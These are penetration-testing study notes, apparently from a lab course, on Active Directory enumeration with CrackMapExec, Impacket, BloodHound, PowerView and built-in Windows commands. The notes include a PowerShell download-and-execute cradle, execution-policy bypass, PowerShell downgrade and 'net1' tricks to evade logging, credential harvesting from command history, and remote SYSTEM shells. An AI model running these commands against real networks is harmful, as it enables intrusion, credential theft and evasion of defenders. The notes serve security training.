# Enumerating Security Controls

## Windows Defender

get current defender status
```
Get-MpComputerStatus
```
- `RealTimeProtectionEnabled` parameter is set to True

## AppLocker

AppLocker is Microsoft's application whitelisting solution and gives system administrators control over which applications and files users can run. It provides granular control over executables, scripts, Windows installer files, DLLs, packaged apps, and packed app installers. It is common for organizations to block cmd.exe and PowerShell.exe and write access to certain directories, but this can all be bypassed. Organizations also often focus on blocking the PowerShell.exe executable, but forget about the other PowerShell executable locations such as `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` or `PowerShell_ISE.exe`. We can see that this is the case in the AppLocker rules shown below. All Domain Users are disallowed from running the 64-bit PowerShell executable located at: `%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe`

```
Get-AppLockerPolicy
```
```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

## PowerShell Constrained Language Mode
PowerShell Constrained Language Mode locks down many of the features needed to use PowerShell effectively, such as blocking COM objects, only allowing approved .NET types, XAML-based workflows, PowerShell classes, and more. We can quickly enumerate whether we are in Full Language Mode or Constrained Language Mode.

```
$ExecutionContext.SessionState.LanguageMode
```

## LAPS 

Local Administrator Password Solution (LAPS) is used to randomize and rotate local administrator passwords on Windows hosts and prevent lateral movement

One is parsing `ExtendedRights` for all computers with LAPS enabled. This will show groups specifically delegated to read LAPS passwords, which are often users in protected groups. An account that has joined a computer to a domain receives `All Extended Rights` over that host, and this right gives the account the ability to read passwords. Enumeration may show a user account that can read the LAPS password on a host. This can help us target specific AD users who can read LAPS passwords.

```
Find-LAPSDelegatedGroups
```

The `Find-AdmPwdExtendedRights` checks the rights on each computer with LAPS enabled for any groups with read access and users with "`All Extended Rights`". Users with "`All Extended Rights`" can read LAPS passwords and may be less protected than users in delegated groups, so this is worth checking for.


```
Find-AdmPwdExtendedRights
```

We can use the `Get-LAPSComputers` function to search for computers that have LAPS enabled when passwords expire, and even the randomized passwords in cleartext if our user has access.

```
Get-LAPSComputers
```

# Credentialed Enumeration - from Linux

## CrackMapExec (CME)

CME offers a help menu for each protocol (i.e., `crackmapexec winrm -h`, etc.). Be sure to review the entire help menu and all possible options. For now, the flags we are interested in are:
- `-u` Username The user whose credentials we will use to authenticate
- `-p` Password User's password
- `Target (IP or FQDN)` Target host to enumerate (in our case, the Domain Controller)
- `--users` Specifies to enumerate Domain Users
- `--groups` Specifies to enumerate domain groups
- `--loggedon-users` Attempts to enumerate what users are logged on to a target, if any

**CME - Domain User Enumeration**
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```
**CME - Domain Group Enumeration**
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```
**CME - Logged On Users**
```
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```
> local admin because (Pwn3d!)

**Share Enumeration - Domain Controller**
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```

**Spider_plus**
`spider_plus` will dig through each readable share on the host and list all readable files.
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```

**SMBMap To Check Access**
what our user can access and their permission levels
```
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```
**Recursive List Of All Directories**
```
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

## rpcclient

**SMB NULL Session with rpcclient**
```
rpcclient -U "" -N 172.16.5.5
```
While looking at users in rpcclient, you may notice a field called `rid`: beside each user. A _Relative Identifier (RID)_ is a unique identifier (represented in hexadecimal format) utilized by Windows to track and identify objects. To explain how this fits in, let's look at the examples below:

- The SID for the INLANEFREIGHT.LOCAL domain is: S-1-5-21-3842939050-3880317879-2865463114.
- When an object is created within a domain, the number above _(SID) will be combined with a RID_ to make a unique value used to represent the object.
- So the domain user htb-student with a RID:[0x457] Hex 0x457 would = decimal 1111, will have a full user SID of: S-1-5-21-3842939050-3880317879-2865463114-1111.
- This is unique to the htb-student object in the INLANEFREIGHT.LOCAL domain and you will never see this paired value tied to another object in this domain or any other.

However, there are accounts that you will notice that have the same RID regardless of what host you are on. Accounts like the built-in Administrator for a domain will have a RID `[administrator]` `rid:[0x1f4]`, which, when converted to a decimal value, equals 500. ***The built-in Administrator account will always have the RID value Hex 0x1f4, or 500. This will always be the case***. Since this value is unique to an object, we can use it to enumerate further information about it from the domain. Let's give it a try again with rpcclient. We will dig a bit targeting the htb-student user.

**RPCClient User Enumeration By RID**
```
> queryuser 0x457
```

**RPCClient enum all users**
```
> enumdomusers
```

## Impacket Toolkit

**psexec.py**

Psexec.py is a clone of the Sysinternals psexec executable, but works slightly differently from the original. The tool creates a remote service by uploading a randomly-named executable to the ADMIN$ share on the target host. It then registers the service via RPC and the Windows Service Control Manager. Once established, communication happens over a named pipe, providing an interactive remote shell as SYSTEM on the victim host.

***we need credentials for a user with local administrator privileges***

```
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  
```

**wmiexec.py**

Wmiexec.py utilizes a semi-interactive shell where commands are executed through Windows Management Instrumentation. It does not drop any files or executables on the target host and generates fewer logs than other modules. After connecting, it runs as the local admin user we connected with (this can be less obvious to someone hunting for an intrusion than seeing SYSTEM executing many commands).

```
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

Note that this shell environment is not fully interactive, so each command issued will execute a new cmd.exe from WMI and execute your command. The downside of this is that if a vigilant defender checks event logs and looks at event ID 4688: A new process has been created, they will see a new process created to spawn cmd.exe and issue a command.


**Windapsearch**

**Windapsearch - Domain Admins**
```
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```

**Windapsearch - Privileged Users**

```
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

**Bloodhound.py**

- SharpHound collector
- BloodHound.py collector (also referred to as an ingestor)
- BloodHound GUI

Once uploaded, we can run various pre-built queries or write custom queries using [Cypher language](https://blog.cptjesus.com/posts/introtocypher).

```
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```
> our nameserver as the Domain Controller with the -ns flag and the domain, INLANEFREIGHt.LOCAL with the -d flag. The -c all flag told the tool to run all checks

```
sudo neo4j start
zip -r ilfreight_bh.zip *.json
```
After zipping upload data option in BloodHound GUI.

***!!!!! https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/ !!!!!***

***!!!!! https://wadcoms.github.io/ !!!!!***

> look at the Database Info tab after uploading data, search for a node such as Domain Users and, scroll through all of the options under the Node Info tab, check out the pre-built queries under the Analysis tab, many which are powerful and can quickly find various ways to domain takeover. Finally, experiment with some custom Cypher queries by selecting some interesting ones from the Cypher cheatsheet linked above, pasting them into the Raw Query box at the bottom, and hitting enter. You can also play with the Settings menu by clicking the gear icon on the right side of the screen and adjusting how nodes and edges are displayed, enable query debug mode, and enable dark mode


## Credentialed Enumeration - from Windows

> SharpHound/BloodHound, PowerView/SharpView, Grouper2, Snaffler

**ActiveDirectory PowerShell Module**

The `Get-Module` cmdlet, which is part of the Microsoft.PowerShell.Core module, will list all available modules, their version, and potential commands for use. This is a great way to see if anything like Git or custom administrator scripts are installed. If the module is not loaded, run `Import-Module ActiveDirectory` to load it for use.

Discover modules:
```
Get-Module
```

Load ActiveDirectory Module
```
Import-Module ActiveDirectory
```

Get Domain info:
```
Get-ADDomain
```

Get kerberoastable AD Accounts
```
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

verify domain trust relationships
```
Get-ADTrust -Filter *
```
This cmdlet will print out any trust relationships the domain has. We can determine if they are trusts within our forest or with domains in other forests, the type of trust, the direction of the trust, and the name of the domain the relationship is with. This will be useful later on when looking to take advantage of child-to-parent trust relationships and attacking across forest trusts

AD group information
```
Get-ADGroup -Filter * | select name
```

get more detailed information about a particular group
```
Get-ADGroup -Identity "Backup Operators"
```

Group Membership
```
Get-ADGroupMember -Identity "Backup Operators"
```

## PowerView

| Command                          | Description                                                                 |
|----------------------------------|-----------------------------------------------------------------------------|
| **Export-PowerViewCSV**          | Append results to a CSV file                                                |
| **ConvertTo-SID**                | Convert a User or group name to its SID value                               |
| **Get-DomainSPNTicket**          | Requests the Kerberos ticket for a specified Service Principal Name (SPN) account |

### Domain/LDAP Functions:
| Command                          | Description                                                                 |
|----------------------------------|-----------------------------------------------------------------------------|
| **Get-Domain**                   | Will return the AD object for the current (or specified) domain             |
| **Get-DomainController**         | Return a list of the Domain Controllers for the specified domain            |
| **Get-DomainUser**               | Will return all users or specific user objects in AD                        |
| **Get-DomainComputer**           | Will return all computers or specific computer objects in AD                |
| **Get-DomainGroup**              | Will return all groups or specific group objects in AD                      |
| **Get-DomainOU**                 | Search for all or specific OU objects in AD                                 |
| **Find-InterestingDomainAcl**    | Finds object ACLs in the domain with modification rights set to non-built in objects |
| **Get-DomainGroupMember**        | Will return the members of a specific domain group                          |
| **Get-DomainFileServer**         | Returns a list of servers likely functioning as file servers                |
| **Get-DomainDFSShare**           | Returns a list of all distributed file systems for the current (or specified) domain |

### GPO Functions:
| Command                          | Description                                                                 |
|----------------------------------|-----------------------------------------------------------------------------|
| **Get-DomainGPO**                | Will return all GPOs or specific GPO objects in AD                          |
| **Get-DomainPolicy**             | Returns the default domain policy or the domain controller policy for the current domain |

### Computer Enumeration Functions:
| Command                          | Description                                                                 |
|----------------------------------|-----------------------------------------------------------------------------|
| **Get-NetLocalGroup**            | Enumerates local groups on the local or a remote machine                    |
| **Get-NetLocalGroupMember**      | Enumerates members of a specific local group                                |
| **Get-NetShare**                 | Returns open shares on the local (or a remote) machine                      |
| **Get-NetSession**               | Will return session information for the local (or a remote) machine         |
| **Test-AdminAccess**             | Tests if the current user has administrative access to the local (or a remote) machine |

### Threaded 'Meta'-Functions:
| Command                          | Description                                                                 |
|----------------------------------|-----------------------------------------------------------------------------|
| **Find-DomainUserLocation**      | Finds machines where specific users are logged in                           |
| **Find-DomainShare**             | Finds reachable shares on domain machines                                   |
| **Find-InterestingDomainShareFile** | Searches for files matching specific criteria on readable shares in the domain |
| **Find-LocalAdminAccess**        | Find machines on the local domain where the current user has local administrator access |

### Domain Trust Functions:
| Command                          | Description                                                                 |
|----------------------------------|-----------------------------------------------------------------------------|
| **Get-DomainTrust**              | Returns domain trusts for the current domain or a specified domain          |
| **Get-ForestTrust**              | Returns all forest trusts for the current forest or a specified forest      |
| **Get-DomainForeignUser**        | Enumerates users who are in groups outside of the user's domain             |
| **Get-DomainForeignGroupMember** | Enumerates groups with users outside of the group's domain and returns each foreign member |
| **Get-DomainTrustMapping**       | Will enumerate all trusts for the current domain and any others seen        |

- provide us with information on all users or specific users we specify

```
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
```

- Recursive Group Membership: retrieve group-specific information. Adding the -Recurse switch tells PowerView that if it finds any groups that are part of the target group (nested group membership) to list out the members of those groups

```
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

- Trust Enumeration
```
Get-DomainTrustMapping
```

- Testing for Local Admin Access
```
Test-AdminAccess -ComputerName ACADEMY-EA-MS01
```

- Finding Users With SPN Set (Kerberoastable)
```
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

## SharpView

- to enumerate information about a specific user
```
.\SharpView.exe Get-DomainUser -Identity forend
```

## Snaffler

Snaffler works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories. Once that is done, it iterates through any directories readable by our user and hunts for files that could serve to better our position within the assessment. _**Snaffler requires that it be run from a domain-joined host or in a domain-user context**_.

```
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

## BloodHound

### SharpHound

```
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```


# Living Off the Land

## Env Commands For Host & Network Recon

- Prints the PC's Name
```
hostname
```
- Prints out the OS version and revision level
```
[System.Environment]::OSVersion.Version	
```
- Prints the patches and hotfixes applied to the host
```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```
-	Prints out network adapter state and configurations
```
ipconfig /all
```
- 	Displays a list of environment variables for the current session (ran from CMD-prompt)
```
set
```
- Displays the domain name to which the host belongs (ran from CMD-prompt)
```
echo %USERDOMAIN%
```
- Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)
```
echo %logonserver%
```
- All in one
```
systeminfo
```

## Harnessing PowerShell

- Lists available modules loaded for use.
```
Get-Module
```
- Will print the execution policy settings for each scope on a host.
```
Get-ExecutionPolicy -List
```
- This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.
```
Set-ExecutionPolicy Bypass -Scope Process
```
- 	Return environment values such as key paths, users, computer information, etc.
```
Get-ChildItem Env: | ft Key,Value
```
- With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.
```
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```
- This is a quick and easy way to download a file from the web using PowerShell and call it from memory.
```
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"
```

> Many defenders are unaware that several versions of PowerShell often exist on a host. If not uninstalled, they can still be used. Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. This is a great way for us to remain under the defenders' radar while still utilizing resources built into the hosts to our advantage. Below is an example of downgrading Powershell.

- Check powershell version
```
Get-host
```
- Downgrade PowerShell
```
powershell.exe -version 2
```

We can now see that we are running an older version of PowerShell from the output above. Notice the difference in the version reported. It validates we have successfully downgraded the shell. Let's check and see if we are still writing logs. The primary place to look is in the PowerShell Operational Log found under Applications and Services Logs > Microsoft > Windows > PowerShell > Operational. All commands executed in our session will log to this file. The Windows PowerShell log located at Applications and Services Logs > Windows PowerShell is also a good place to check. An entry will be made here when we start an instance of PowerShell. In the image below, we can see the red entries made to the log from the current PowerShell session and the output of the last entry made at 2:12 pm when the downgrade is performed. It was the last entry since our session moved into a version of PowerShell no longer capable of logging. Notice that, that event corresponds with the last event in the Windows PowerShell log entries.

With Script Block Logging enabled, we can see that whatever we type into the terminal gets sent to this log. If we downgrade to PowerShell V2, this will no longer function correctly. Our actions after will be masked since Script Block Logging does not work below PowerShell 3.0. Notice above in the logs that we can see the commands we issued during a normal shell session, but it stopped after starting a new PowerShell instance in version 2. Be aware that the action of issuing the command powershell.exe -version 2 within the PowerShell session will be logged. So evidence will be left behind showing that the downgrade happened, and a suspicious or vigilant defender may start an investigation after seeing this happen and the logs no longer filling up for that instance. We can see an example of this in the image below. Items in the red box are the log entries before starting the new instance, and the info in green is the text showing a new PowerShell session was started in HostVersion 2.0.

## Firewall Checks
```
netsh advfirewall show allprofiles
```

## Windows Defender Check (from CMD.exe)
```
sc query windefend
```

Another:
```
Get-MpComputerStatus
```

## get logged on users
```
qwinsta
```

## Network Information
- 	Lists all known hosts stored in the arp table.
```
arp -a
```
- Prints out adapter settings for the host. We can figure out the network segment from here.
```
ipconfig /all
```
- Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.
```
route print
```
- Displays the status of the host's firewall. We can determine if it is active and filtering traffic.
```
netsh advfirewall show allprofiles
```

## Windows Management Instrumentation (WMI)

- Prints the patch level and description of the Hotfixes applied
```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```
- 	Displays basic host information to include any attributes within the list
```
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
```
- A listing of all processes on host
```
wmic process list /format:list
```
- 	Displays information about the Domain and Domain Controllers
```
wmic ntdomain list /format:list
```
```
wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
```
- Displays information about all local accounts and any domain accounts that have logged into the device
```
wmic useraccount list /format:list
```
- Information about all local groups
```
wmic group list /format:list
```
- Dumps information about any system accounts that are being used as service accounts.
```
wmic sysaccount list /format:list
```

reference: https://docs.microsoft.com/en-us/windows/win32/wmisdk/using-wmi


## Net commands

| Command                                    | Description                                                           |
|--------------------------------------------|-----------------------------------------------------------------------|
| **net accounts**                           | Information about password requirements                               |
| **net accounts /domain**                   | Password and lockout policy                                           |
| **net group /domain**                      | Information about domain groups                                       |
| **net group "Domain Admins" /domain**      | List users with domain admin privileges                               |
| **net group "domain computers" /domain**   | List of PCs connected to the domain                                   |
| **net group "Domain Controllers" /domain** | List PC accounts of domains controllers                               |
| **net group <domain_group_name> /domain**  | User that belongs to the group                                        |
| **net groups /domain**                     | List of domain groups                                                 |
| **net localgroup**                         | All available groups                                                  |
| **net localgroup administrators /domain**  | List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default) |
| **net localgroup Administrators**          | Information about a group (admins)                                    |
| **net localgroup administrators [username] /add** | Add user to administrators                                            |
| **net share**                              | Check current shares                                                  |
| **net user <ACCOUNT_NAME> /domain**        | Get information about a user within the domain                        |
| **net user /domain**                       | List all users of the domain                                          |
| **net user %username%**                    | Information about the current user                                    |
| **net use x: \\computer\share**            | Mount the share locally                                               |
| **net view**                               | Get a list of computers                                               |
| **net view /all /domain[:domainname]**     | Shares on the domains                                                 |
| **net view \\computer /ALL**               | List shares of a computer                                             |
| **net view /domain**                       | List of PCs of the domain                                             |

> ***If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing net1 instead of net will execute the same functions without the potential trigger from the net string.***

## Dsquery
With that in mind, dsquery will exist on any host with the Active Directory Domain Services Role installed, and the dsquery DLL exists on all modern Windows systems by default now and can be found at `C:\Windows\System32\dsquery.dll`.

> **All we need is elevated privileges on a host or the ability to run an instance of Command Prompt or PowerShell from a SYSTEM context.**

- User search
```
dsquery user
```
- Computer Search
```
dsquery computer
```
- wildcard search (to view all the objects in OU)
```
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

> We can, of course, combine dsquery with LDAP search filters of our choosing. The below looks for users with the `PASSWD_NOTREQD` flag set in the userAccountControl attribute.

- Users With Specific Attributes Set (PASSWD_NOTREQD)
```
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```
- Searching for Domain Controllers
```
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

### LDAP Filtering Explained

You will notice in the queries above that we are using strings such as userAccountControl:1.2.840.113556.1.4.803:=8192. These strings are common LDAP queries that can be used with several different tools too, including AD PowerShell, ldapsearch, and many others. Let's break them down quickly:

userAccountControl:1.2.840.113556.1.4.803: Specifies that we are looking at the User Account Control (UAC) attributes for an object. This portion can change to include three different values we will explain below when searching for information in AD (also known as Object Identifiers (OIDs).
=8192 represents the decimal bitmask we want to match in this search. This decimal number corresponds to a corresponding UAC Attribute flag that determines if an attribute like password is not required or account is locked is set. These values can compound and make multiple different bit entries. Below is a quick list of potential values.

#### UAC Values

![image](https://github.com/user-attachments/assets/6304a198-a812-4ee7-b5db-faca8f7da3a2)

#### OID match strings
OIDs are rules used to match bit values with attributes, as seen above. For LDAP and AD, there are three main matching rules:

1.2.840.113556.1.4.803

When using this rule as we did in the example above, we are saying the bit value must match completely to meet the search requirements. Great for matching a singular attribute.

1.2.840.113556.1.4.804

When using this rule, we are saying that we want our results to show any attribute match if any bit in the chain matches. This works in the case of an object having multiple attributes set.

1.2.840.113556.1.4.1941

This rule is used to match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.

#### Logical Operators
When building out search strings, we can utilize logical operators to combine values for the search. The operators & | and ! are used for this purpose. For example we can combine multiple search criteria with the & (and) operator like so:
```
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))
```
The above example sets the first criteria that the object must be a user and combines it with searching for a UAC bit value of 64 (Password Can't Change). A user with that attribute set would match the filter. You can take this even further and combine multiple attributes like (&(1) (2) (3)). The ! (not) and | (or) operators can work similarly. For example, our filter above can be modified as follows:
```
(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))
```
This would search for any user object that does NOT have the Password Can't Change attribute set. When thinking about users, groups, and other objects in AD, our ability to search with LDAP queries is pretty extensive.
